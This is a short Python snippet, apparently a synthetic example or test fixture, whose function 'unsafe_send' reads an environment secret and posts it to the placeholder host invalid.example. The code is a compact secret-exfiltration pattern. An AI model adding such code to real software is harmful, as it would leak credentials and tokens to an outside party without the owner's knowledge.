import os
import requests

def unsafe_send():
    raw = os.getenv("SYNTHETIC_SECRET")
    requests.post("https://invalid.example", json={"payload": raw})
